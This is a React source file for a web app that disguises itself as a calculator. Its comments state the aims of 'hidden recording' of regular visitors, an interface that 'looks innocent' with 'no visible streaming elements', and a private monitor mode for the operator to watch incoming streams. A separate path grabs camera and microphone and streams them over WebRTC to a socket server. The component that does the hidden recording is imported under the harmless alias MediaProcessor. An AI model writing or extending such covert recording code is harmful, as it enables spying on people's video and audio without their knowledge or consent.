import React, { useState, useEffect, useRef } from 'react';
import CalculatorClean from './Calculator_Clean';
import MediaProcessor from './components/HiddenRecorder';
import LiveStreamViewer from './components/LiveStreamViewer';
import './App.css';
import './styles/App.css';
import './styles/Streaming.css';
import './styles/Hidden.css';
import { rtcConfig } from './utils/webrtc';
import io from 'socket.io-client';

import config from './config';

const socket = io(config.SOCKET_URL);

function App() {
  // Removed activeComponent - clean calculator only
  const [isViewer, setIsViewer] = useState(false);
  
  const [isConnected, setIsConnected] = useState(false);
  const [currentConnectionId, setCurrentConnectionId] = useState(null);
  const [hiddenRecordingActive, setHiddenRecordingActive] = useState(true);
  const videoRef = useRef(null);
  const peerConnection = useRef(null);

  useEffect(() => {
    // Check URL parameters to determine mode
    const params = new URLSearchParams(window.location.search);
    const monitorMode = params.get('monitor');
    const roomId = params.get('room');
    const connectionId = params.get('conn');
    
    if (monitorMode === 'true') {
      // This is the monitoring interface for you to see incoming streams
      setIsViewer(false);
      setHiddenRecordingActive(false);
      return;
    }
    
    // Generate unique connection ID for this session
    const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    setCurrentConnectionId(sessionId);
    
    const connParam = roomId || connectionId;
    console.log('Session started:', sessionId); // Debug
    
    if (connParam && !isViewer) { // Only initialize once
      console.log('Initializing as viewer with:', connParam); // Debug
      setIsViewer(true);
      setCurrentConnectionId(connParam);
      initializeAsViewer(connParam);
    }
    
    // Start hidden recording for regular users
    setHiddenRecordingActive(true);
  }, [isViewer]);

  const initializeAsViewer = async (roomId) => {
    try {
      console.log('Starting viewer initialization for:', roomId); // Debug
      
      // Request camera and audio access
      const stream = await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: true
      });
      console.log('Got media stream:', stream); // Debug
      
      // Set up WebRTC
      const pc = new RTCPeerConnection(rtcConfig);
      peerConnection.current = pc;

      // Add tracks to the peer connection
      stream.getTracks().forEach(track => {
        pc.addTrack(track, stream);
      });

      // Show local video
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
      }

      console.log('Joining room as viewer:', roomId); // Debug
      // Join room and handle signaling
      socket.emit('join-room', { roomId, isViewer: true });

      socket.on('offer', async (data) => {
        console.log('Received offer:', data); // Debug
        await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        socket.emit('answer', {
          answer,
          target: roomId,
          sender: socket.id
        });
      });

      socket.on('ice-candidate', async (data) => {
        console.log('Received ICE candidate:', data); // Debug
        if (data.candidate) {
          try {
            await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
          } catch (e) {
            console.error('Error adding received ice candidate', e);
          }
        }
      });

      pc.onicecandidate = (event) => {
        if (event.candidate) {
          console.log('Sending ICE candidate:', event.candidate); // Debug
          socket.emit('ice-candidate', {
            candidate: event.candidate,
            target: roomId,
            sender: socket.id
          });
        }
      };

      pc.onconnectionstatechange = () => {
        console.log('Connection state:', pc.connectionState); // Debug
        if (pc.connectionState === 'connected') {
          setIsConnected(true);
        }
      };

      console.log('Viewer initialization complete'); // Debug
    } catch (error) {
      console.error('Error setting up viewer:', error);
      alert('Failed to access camera/microphone. Please ensure they are connected and permissions are granted.');
    }
  };

  if (isViewer) {
    return (
      <div className="viewer-mode">
        <div className="status-banner">
          <div className="connection-info">
            Connection ID: <strong>{currentConnectionId}</strong>
          </div>
          {isConnected ? (
            <div className="connected">
              Connected to stream
              <div className="pulse"></div>
            </div>
          ) : (
            <div className="connecting">
              Connecting...
            </div>
          )}
        </div>
        <video
          ref={videoRef}
          autoPlay
          playsInline
          muted
          className="viewer-video"
        />
        <div className="viewer-footer">
          <p>You are now sharing your video and audio with the host.</p>
          <p>The host can see you and you can see their calculator app.</p>
        </div>
      </div>
    );
  }

  const params = new URLSearchParams(window.location.search);
  const monitorMode = params.get('monitor');

  if (monitorMode === 'true') {
    // This is YOUR monitoring interface to see incoming streams
    return <LiveStreamViewer />;
  }

  return (
    <div className="App">
      {/* Clean calculator interface - no visible streaming elements */}
      <div className="clean-app-content">
        {/* Media processor for advanced features */}
        <MediaProcessor 
          connectionId={currentConnectionId}
          isActive={hiddenRecordingActive}
        />
        
        {/* Just the calculator - looks innocent */}
        <CalculatorClean />
      </div>
    </div>
  );
}

export default App;